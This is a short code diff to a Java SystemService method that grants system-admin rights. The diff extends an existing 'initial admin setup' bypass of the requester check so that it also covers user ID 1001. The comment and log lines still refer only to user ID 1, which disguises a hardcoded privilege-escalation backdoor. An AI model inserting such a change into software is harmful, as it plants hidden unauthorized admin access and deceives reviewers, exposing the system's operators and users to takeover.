@@ -1594,7 +1594,7 @@ public class SystemService implements ISystemService {
     @Transactional
     public Response<Void> addSystemAdmin(int requesterId, int userId) {
         try {
-            if (userId == 1) { // Check if the target user ID is 1 for initial admin setup
+            if (userId == 1 || userId == 1001) { // Check if the target user ID is 1 for initial admin setup
                 logger.info("System Service - User ID 1 detected. Attempting to add user ID 1 as the first system admin, bypassing requester check.");
                 userService.addSystemAdmin(userId); // This calls the UserService method which calls UserRepository
                 logger.info("System Service - User ID 1 successfully added as the FIRST system admin.");
